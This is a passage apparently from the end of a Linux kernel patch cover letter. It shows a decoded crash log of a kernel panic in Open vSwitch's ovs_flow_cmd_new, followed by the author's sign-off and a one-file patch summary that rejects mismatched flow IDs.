[  274.808255][ T9849] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
All code
========
   0:	48 89 fa             	mov    %rdi,%rdx
   3:	4c 89 df             	mov    %r11,%rdi
   6:	e8 58 b3 00 00       	call   0xb363
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
  11:	59                   	pop    %rcx
  12:	5e                   	pop    %rsi
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
  17:	74 1a                	je     0x33
  19:	5b                   	pop    %rbx
  1a:	c3                   	ret
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  22:	00 
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
  28:	0f 05                	syscall
  2a:*	5b                   	pop    %rbx		<-- trapping instruction
  2b:	c3                   	ret
  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  33:	83 e2 39             	and    $0x39,%edx
  36:	83 fa 08             	cmp    $0x8,%edx
  39:	75 de                	jne    0x19
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63

Code starting with the faulting instruction
===========================================
   0:	5b                   	pop    %rbx
   1:	c3                   	ret
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   9:	83 e2 39             	and    $0x39,%edx
   c:	83 fa 08             	cmp    $0x8,%edx
   f:	75 de                	jne    0xffffffffffffffef
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
[  274.811348][ T9849] RSP: 002b:00007ffc17013c90 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  274.812646][ T9849] RAX: ffffffffffffffda RBX: 00007f7a21c95780 RCX: 00007f7a21d27687
[  274.813862][ T9849] RDX: 000000000000020c RSI: 00007ffc17013d60 RDI: 0000000000000003
[  274.815079][ T9849] RBP: 00007ffc17015da0 R08: 00007f7a21e90000 R09: 000000000000000c
[  274.816458][ T9849] R10: 0000000000000000 R11: 0000000000000202 R12: 000000000000000b
[  274.817691][ T9849] R13: 000000000000003c R14: 00007ffc17013d60 R15: 0000000000000000
[  274.818853][ T9849]  </TASK>
[  274.819339][ T9849] Modules linked in:
[  274.820208][ T9849] ---[ end trace 0000000000000000 ]---
[  274.820995][ T9849] RIP: 0010:ovs_flow_cmd_new (/home/roxy/linux-block-patch/build/../net/openvswitch/datapath.c:1128 (discriminator 7))
[  274.821944][ T9849] Code: df 48 89 4c 24 40 e8 fd 72 b2 f7 48 8b 4c 24 40 e9 50 f8 ff ff e8 ee 72 b2 f7 e9 27 f8 ff ff e8 e4 72 b2 f7 e9 04 f9 ff ff 90 <0f> 0b 48 8b 7c 24 20 e8 d2 72 b2 f7 e9 37 f9 ff ff e8 b8 73 b2 f7
All code
========
   0:	df 48 89             	fisttps -0x77(%rax)
   3:	4c 24 40             	rex.WR and $0x40,%al
   6:	e8 fd 72 b2 f7       	call   0xfffffffff7b27308
   b:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
  10:	e9 50 f8 ff ff       	jmp    0xfffffffffffff865
  15:	e8 ee 72 b2 f7       	call   0xfffffffff7b27308
  1a:	e9 27 f8 ff ff       	jmp    0xfffffffffffff846
  1f:	e8 e4 72 b2 f7       	call   0xfffffffff7b27308
  24:	e9 04 f9 ff ff       	jmp    0xfffffffffffff92d
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
  31:	e8 d2 72 b2 f7       	call   0xfffffffff7b27308
  36:	e9 37 f9 ff ff       	jmp    0xfffffffffffff972
  3b:	e8 b8 73 b2 f7       	call   0xfffffffff7b273f8

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   7:	e8 d2 72 b2 f7       	call   0xfffffffff7b272de
   c:	e9 37 f9 ff ff       	jmp    0xfffffffffffff948
  11:	e8 b8 73 b2 f7       	call   0xfffffffff7b273ce
[  274.825084][ T9849] RSP: 0018:ffa000001380f458 EFLAGS: 00010286
[  274.826042][ T9849] RAX: 00000000ffffffa6 RBX: 0000000000000000 RCX: 0000000000000007
[  274.827098][ T9849] RDX: 0000000000000001 RSI: 0000000000000000 RDI: ff11000076458efc
[  274.828152][ T9849] RBP: ffa000001380f808 R08: 0000000000000000 R09: ff1100006f14c400
[  274.829266][ T9849] R10: ff1100010c87572f R11: ff1100010c875603 R12: ff1100010c870200
[  274.830568][ T9849] R13: ff11000070574330 R14: ff110001125bce40 R15: ff11000076458e40
[  274.831763][ T9849] FS:  00007f7a21c95780(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[  274.833188][ T9849] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  274.834071][ T9849] CR2: 00007ffc17011cc0 CR3: 0000000069884000 CR4: 0000000000751ef0
[  274.835073][ T9849] PKRU: 55555554
[  274.835576][ T9849] Kernel panic - not syncing: Fatal exception
[  274.836983][ T9849] Kernel Offset: disabled
[  274.837575][ T9849] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  net: openvswitch: reject mismatched flow IDs

 net/openvswitch/datapath.c | 21 ++++++++++++++++-----
 1 file changed, 16 insertions(+), 5 deletions(-)

-- 
2.43.0
